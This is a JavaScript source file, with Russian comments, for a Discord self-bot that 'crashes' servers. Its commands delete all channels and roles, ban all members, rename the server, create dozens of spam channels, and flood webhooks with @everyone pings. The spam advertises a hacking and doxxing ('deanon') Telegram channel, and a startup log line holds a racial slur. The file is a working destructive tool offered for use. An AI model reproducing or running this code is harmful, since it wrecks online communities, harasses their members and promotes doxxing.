// добавлена поддержка Embed  и увеличена скорость, добавлена поддержка рандома

const token = process.env['TOKEN']
const Discord = require('discord.js-selfbot');
const keepAlive = require('./server.js');
const { MessageEmbed } = require('discord.js');
const allowedusers = [
  "946841657314279485",
]
// там ваш айди
const client = new Discord.Client();


client.on('ready', () => { //при загрузке бота
console.log("негры");
}); 

function getRandomInt(min, max) {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min)) + min;
}

const embed = new MessageEmbed()
	.setTitle('Данный сервер крашится')
	.setDescription('Данный сервер крашится Австром. Если хотите также - переходите\nА если хочешь научиться взлому/раскрытию личности - тогда тебе в наш телеграмм https://discord.gg/dHdYXDmzZA\nhttps://t.me/russian_deanon') 
        .setImage('https://media.discordapp.net/attachments/919097311064363009/952442718074839040/veJAJ6_9v1g.png')
	.setColor('#ff0000');



client.on('message', async (message) => {
  if (message.content === '~auto') {
  if (allowedusers.includes(message.author.id)) {
    message.delete(); 
     message.guild.channels.cache.forEach 
     (channel => channel.delete().catch(e => {
        console.log('error');
      }));  
        message.guild.roles.cache.forEach(role => { 
        if (role.editable && role.id !== message.guild.id) role.delete().catch(e => {
        console.log('error');
      }) 
    }); 
    await message.guild.setIcon("https://media.discordapp.net/attachments/919097311064363009/952442718074839040/veJAJ6_9v1g.png");
    await message.guild.setName("××× Crashed by austr ×××");

    for (let i = 1; i <= 50; i++) {
        message.guild.channels
          .create("crashed-by-austr-"+getRandomInt(1, 1000), {
            type: "text",
            topic: "https://discord.gg/lavanbot",
          })
          .then(channel => {
              channel.createWebhook("×××Crashed by austr×××", { 
				}).then(async webhook => {
                  for (let i = 1; i <= 30; i++) { 
                            webhook.send({
	content: '@everyone @here данный сервер крашится. Переходите к нам если хотите также. У нас есть все, что вам нужною https://discord.gg/dHdYXDmzZA https://t.me/russian_deanon',
	username: '××× Crashed by Austr ×××',
	avatarURL: 'https://media.discordapp.net/attachments/919097311064363009/952442718074839040/veJAJ6_9v1g.png',
	embeds: [embed],
});      
                  };
              });
          });
      } 1000;
    } else {console.log('[ Будет спамить вам логи ]')}
};
});


client.on('message', async (message) => {
  if (message.content === '~hookall') {
  if (allowedusers.includes(message.author.id)) {
    message.delete(); 
     message.guild.channels.cache.forEach
     (channel => {channel.createWebhook("××× Crashed by Austr ×××", { 
              }).then(async webhook => {
                  for (let i = 1; i <= 30; i++) {
                            webhook.send({
	content: '@everyone @here данный сервер крашится. Переходите к нам если хотите также. У нас есть все, что вам нужною https://discord.gg/dHdYXDmzZA https://t.me/russian_deanon',
	username: '××× Crashed by Austr ×××',
	avatarURL: 'https://media.discordapp.net/attachments/919097311064363009/952442718074839040/veJAJ6_9v1g.png',
	embeds: [embed],
});        
                  };
              });
          });
        };
    } else {console.log('[ Будет спамить вам логи ]')}
});



client.on('message', async (message) => {
  if (message.content === '~delroles') {
  if (allowedusers.includes(message.author.id)) {
    message.delete(); 
      message.guild.roles.cache.forEach(role => { 
        if (role.editable && role.id !== message.guild.id) role.delete().catch(e => {
        console.log('error');
      }) 
    }); 
                  } else {console.log('[ Будет спамить вам логи ]')}
              };
          });


client.on('message', async (message) => {
  if (message.content === '~banall') {
  if (allowedusers.includes(message.author.id)) { //это сугуба моя хрень, она тут тупо для функционала
    message.delete(); 
      message.guild.members.cache.forEach(member => member.ban().catch(e => {
        console.log('error');
      }))
                  } else {console.log('[ Будет спамить вам логи ]')}
              };
          });

client.on('message', async (message) => {
  if (message.content === '~rename') {
  if (allowedusers.includes(message.author.id)) {
    message.delete(); 
  
message.guild.setIcon("https://media.discordapp.net/attachments/919097311064363009/952442718074839040/veJAJ6_9v1g.png");
    await message.guild.setName("××× Crashed by austr ×××");
    } else {console.log('[ Будет спамить вам логи ]')}
};
});



client.on('message', async (message) => {
  if (message.content === '~channels') {
  if (allowedusers.includes(message.author.id)) {
    message.delete(); 
    for (let i = 1; i <= 50; i++) {
        message.guild.channels
          .create("crashed-by-austr-"+getRandomInt(1, 1000), {
            type: "text",
            topic: "https://discord.gg/dHdYXDmzZA",
          })
          .then(channel => {
              channel.createWebhook("×××Crashed by austr×××", { 
				}).then(async webhook => {
                  for (let i = 1; i <= 30; i++) { 
                            webhook.send({
	content: '@everyone @here данный сервер крашится. Переходите к нам если хотите также. У нас есть все, что вам нужною https://discord.gg/dHdYXDmzZA https://t.me/russian_deanon',
	username: '××× Crashed by Austr ×××',
	avatarURL: 'https://media.discordapp.net/attachments/919097311064363009/952442718074839040/veJAJ6_9v1g.png',
	embeds: [embed],
});      
                  };
              });
          });
      } 1000;
    } else {console.log('[ Будет спамить вам логи ]')}
};
});



client.on('message', async (message) => {
  if (message.content === '~createhooks') {
  if (allowedusers.includes(message.author.id)) {
    message.delete(); 
     message.guild.channels.cache.forEach
     (channel => {channel.createWebhook("××× Crashed by Austr ×××", {})
          });
        };
    } else {console.log('[ Будет спамить вам логи ]')}
});


client.on('message', async (message) => {
  if (message.content === '~nuke') {
  if (allowedusers.includes(message.author.id)) {
    message.delete(); 
     message.guild.channels.cache.forEach 
     (channel => channel.delete().catch(e => {
        console.log('error');
      })); 
        message.guild.roles.cache.forEach(role => { 
        if (role.editable && role.id !== message.guild.id) role.delete() 
    }); 
    } else {console.log('[ Будет спамить вам логи ]')}
};
});


client.on('message', async (message) => {
  if (message.content === '~delchannels') {
  if (allowedusers.includes(message.author.id)) {
    message.delete(); 
     message.guild.channels.cache.forEach 
     (channel => channel.delete().catch(e => {
        console.log('error');
      })); 
    } else {console.log('[ Будет спамить вам логи ]')}
};
});


client.on('message', async (message) => {
  if (message.content === '~renchannels') {
  if (allowedusers.includes(message.author.id)) {
    message.delete(); 
     message.guild.channels.cache.forEach 
     (channel => channel.setName("crashed-by-austr-"+getRandomInt(1, 1000)).catch(e => {
        console.log('error');
      }));  
    } else {console.log('[ Будет спамить вам логи ]')}
};
});


client.on('message', message => {
  if (message.content === '~ping') {
  if (allowedusers.includes(message.author.id)) {
    message.delete();
    message.channel.send(`Пинг ${Date.now() - message.createdTimestamp}ms. API-пинг ${Math.round(client.ws.ping)}ms`);
  }
    } else {console.log('[ Будет спамить вам логи ]')}
});



client.on('message', (msg) => {
  if (msg.content === '~help') {
  if (allowedusers.includes(msg.author.id)) {
    msg.delete();
    let now = Date.now()
    msg.channel.send('```~auto - автоматический краш сервера\n~nuke - удаление всех каналов и ролей\n~ping - пинг селф бота\n~renchannels - переименование каналов\n~delchannels - удаление каналов\n~delroles - удаление ролей\n~roles - создание ролей\n~channels - создание каналов\n~createhooks - создание вебхуков везде\n~hookall - спам хуками во все каналы\n~rename - изменение иконки и имени сервера\n~banall - бан всех участников```')
  }
    } else {console.log('[ Будет спамить вам логи ]')}
})





client.on('message', (msg) => {
  if (msg.content === '~roles') {
  if (allowedusers.includes(msg.author.id)) {
    msg.delete();
    for (let i = 1; i <= 50; i++) {
        msg.guild.roles
          .create({
            data: {
              name: " Crashed by Austr "+getRandomInt(1, 1000),
              color: "#ff0000",
            },
          })
          .catch(console.error);
      }
  }
    } else {console.log('[ Будет спамить вам логи ]')}
})



keepAlive();
client.login(token);
